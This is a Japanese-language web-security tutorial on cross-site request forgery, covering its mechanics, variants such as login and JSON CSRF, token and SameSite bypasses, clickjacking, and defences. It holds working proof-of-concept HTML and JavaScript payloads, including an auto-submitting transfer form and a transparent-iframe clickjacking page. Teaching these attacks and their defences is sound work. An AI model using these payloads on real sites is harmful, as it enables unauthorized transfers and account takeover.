CSRF (Cross-Site Request Forgery)

被害者のブラウザを利用して、本人が意図しないリクエストをターゲットに送信させる。 SameSite=Lax デフォルト化で古典的 CSRF は減少傾向だが、バイパス手法は健在。

Theory WSA Lab Hands-on

原理と仕組み

ブラウザは同一ドメインへのリクエストに自動的に Cookie を付与する。 CSRF はこの仕組みを悪用し、攻撃者のサイトから被害者の認証済みセッションで ターゲットにリクエストを送信させる。

<!-- 攻撃者のサイトに設置 -->
<form action="https://bank.com/transfer" method="POST" id="csrf-form">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf-form').submit();</script>

<!-- 被害者がこのページを訪問すると:
     bank.com への POST が被害者の Cookie 付きで送信される -->
CSRF が成立する条件
  • Cookie ベースの認証 (セッション Cookie が自動送信される)
  • CSRF トークンが存在しない or 検証が不十分
  • SameSite 属性が None or 未設定 (古いブラウザ)
  • アクションが副作用を持つ (データ変更、設定変更等)

種類と分類

1. Classic CSRF (Form-based)

HTML フォームを利用した基本的な CSRF。POST リクエストで状態変更を実行。

2. Login CSRF

被害者を攻撃者のアカウントにログインさせる。その後被害者が入力する情報 (クレジットカード、住所等) が攻撃者のアカウントに保存される。 

<form action="https://target.com/login" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="password" value="attackerpass">
</form>

3. JSON CSRF

JSON API に対する CSRF。Content-Type の制限を回避する技術。 

<!-- Content-Type: text/plain で JSON を送信 (Simple Request) -->
<form action="https://api.target.com/settings" method="POST"
      enctype="text/plain">
    <input name='{"email":"attacker@evil.com","x":"' value='"}' type="hidden">
</form>
<!-- 送信される body: {"email":"attacker@evil.com","x":"="} -->

<!-- fetch + navigate (Content-Type bypass) -->
<script>
fetch('https://api.target.com/settings', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'text/plain'},
    body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>

4. CSRF Token Bypass Techniques

// Token 削除: パラメータ自体を除去
POST /change-email
email=attacker@evil.com
(csrf_token パラメータを省略 → サーバーが検証スキップ)

// 別ユーザーの Token 使用
// サーバーがトークンとセッションを紐付けていない場合

// Token in Cookie (Double Submit)
// Cookie と body の値が同じかだけ検証
// → Cookie injection で攻撃者が任意の値をセット可能

// HTTP Method Override
POST /change-email → GET /change-email?email=x
(GET にはトークン検証なし)
_method=GET, X-HTTP-Method-Override: GET

5. SameSite Bypass

// SameSite=Lax は GET には Cookie を付与する
// Method Override で GET + 副作用を実現:
<a href="https://target.com/change-email?email=evil&_method=POST">Click</a>

// Open Redirect 経由
// same-site 内の open redirect を利用:
https://target.com/redirect?url=https://target.com/change-email?email=evil

// Subdomain からの攻撃
// SameSite は eTLD+1 で判定
// sub.target.com に XSS があれば target.com への CSRF 可能

// window.open + Lax (2分ルール)
// Chrome: Cookie 設定後120秒以内は Lax でも top-level POST で送信
<script>
window.open('https://target.com/change-email', '_blank');
// 新しいタブで top-level navigation → Lax Cookie 付与
</script>

防御と Bypass

Modern CSRF 防御

  • SameSite=Strict/Lax - Chrome 80+ でデフォルト Lax（最大の防御層）
  • CSRF Token (Synchronizer Token Pattern) - フォームごとにランダムトークン
  • Double Submit Cookie - Cookie とパラメータの一致検証
  • Origin/Referer 検証 - リクエスト元の確認
  • Custom Header 要求 - X-Requested-With 等 (CORS preflight 必要)
SameSite=Lax 時代の CSRF

2020年以降、主要ブラウザは Cookie のデフォルトを SameSite=Lax に変更。 これにより classic CSRF (cross-origin POST) はほぼ死んだ。 しかし以下のケースでは依然として CSRF が可能:

  • GET リクエストで副作用があるエンドポイント
  • SameSite=None が明示的に設定されている API
  • Same-site 内の XSS/Open Redirect からのチェーン
  • Method override による GET→POST 変換

Clickjacking との関連

Clickjacking は CSRF の「視覚版」とも言える。iframe で透明にターゲットサイトを表示し、 被害者に正規のボタンをクリックさせる。 

<!-- Clickjacking PoC -->
<style>
iframe { position: absolute; top: 0; left: 0; width: 100%;
         height: 100%; opacity: 0.0001; z-index: 2; }
.decoy { position: relative; z-index: 1; }
</style>
<div class="decoy"><button>Click to win!</button></div>
<iframe src="https://target.com/delete-account"></iframe>

防御: X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors 'none'

Key Takeaways

  • SameSite=Lax が主な防御: だが GET 副作用や same-site XSS で突破可能
  • Token bypass は系統的に: 削除、空文字、別セッション、再利用を全試行
  • JSON API も対象: Content-Type 検証なければ text/plain で CSRF 可能
  • Impact を示す: パスワード変更、メール変更、管理者操作の CSRF は高評価
  • チェーン価値: Self-XSS + CSRF、Open Redirect + CSRF で severity 上昇
